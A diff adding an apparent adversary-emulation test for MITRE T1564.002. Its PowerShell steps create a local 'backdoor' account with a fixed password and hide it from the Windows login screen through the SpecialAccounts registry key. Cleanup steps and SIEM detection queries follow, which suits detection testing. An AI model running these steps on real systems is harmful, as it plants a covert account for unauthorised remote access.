@@ -1,0 +1,98 @@
+id: T1564.002_hidden_users
+name: "Hide Artifacts — Hidden Users"
+mitre_technique: "T1564.002"
+mitre_tactic: "defense_evasion"
+description: >
+  Adversaries create local user accounts and then hide them from the Windows login
+  screen and user management interfaces by setting the account as disabled or by
+  adding a registry value under HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\
+  SpecialAccounts\UserList with a DWORD value of 0. This hides the account from the
+  login screen while leaving it usable for remote access. Requires elevation.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1564/002/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1564.002 — Hidden Users simulation (elevation required)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Create a backdoor user account"
+    command: |
+      $username = "PAS_T1564_002_svc"
+      $password = ConvertTo-SecureString "PAS-Temp-Pass1!" -AsPlainText -Force
+      New-LocalUser -Name $username -Password $password `
+          -Description "PAS test account" -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Local user created: $username"
+      Write-Host "[PAS] Visible in 'net user' and login screen"
+
+  - step: 3
+    type: exec_powershell
+    description: "Hide user from login screen via SpecialAccounts registry key"
+    command: |
+      $username = "PAS_T1564_002_svc"
+      $regPath  = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
+      if (-not (Test-Path $regPath)) {
+          New-Item $regPath -Force | Out-Null
+      }
+      Set-ItemProperty $regPath -Name $username -Value 0 -Type DWord -Force
+      Write-Host "[PAS] SpecialAccounts\UserList registry entry set: $username = 0"
+      Write-Host "[PAS] User now hidden from login screen but still functional for RDP/service use"
+
+  - step: 4
+    type: exec_powershell
+    description: "Verify the account exists but is hidden"
+    command: |
+      $username = "PAS_T1564_002_svc"
+      $user = Get-LocalUser -Name $username -ErrorAction SilentlyContinue
+      Write-Host "[PAS] Account exists: $($null -ne $user)"
+      Write-Host "[PAS] Account enabled: $($user.Enabled)"
+
+      $regVal = (Get-ItemProperty `
+          "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" `
+          -Name $username -ErrorAction SilentlyContinue).$username
+      Write-Host "[PAS] SpecialAccounts registry value: $regVal (0 = hidden)"
+
+  - step: 5
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 6
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — Event ID 4720 (account created), SpecialAccounts registry write"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove hidden user account and registry entry"
+    command: |
+      $username = "PAS_T1564_002_svc"
+      Remove-LocalUser -Name $username -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] User account removed: $username"
+      Remove-ItemProperty `
+          "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" `
+          -Name $username -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] SpecialAccounts registry entry removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1564.002 cleanup complete"
+
+analyst_checklist:
+  - "Event ID 4720: A user account was created"
+  - "Event ID 4722: A user account was enabled"
+  - "Registry event: HKLM\...\SpecialAccounts\UserList\<username> = 0 written"
+  - "Sentinel: SecurityEvent | where EventID == 4720 and TargetUserName !contains '$'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'SpecialAccounts\\UserList'"
+  - "MDE alert: 'Hidden user account created' or 'SpecialAccounts registry modification'"
+  - "CONTROL CHECK: Any write to SpecialAccounts\UserList should be an immediate high-priority alert"
+  - "CONTROL CHECK: Correlate new account creation (4720) with SpecialAccounts registry write in same session"
+  - "CONTROL CHECK: Regularly enumerate hidden accounts: Get-ItemProperty HKLM:\...\SpecialAccounts\UserList"
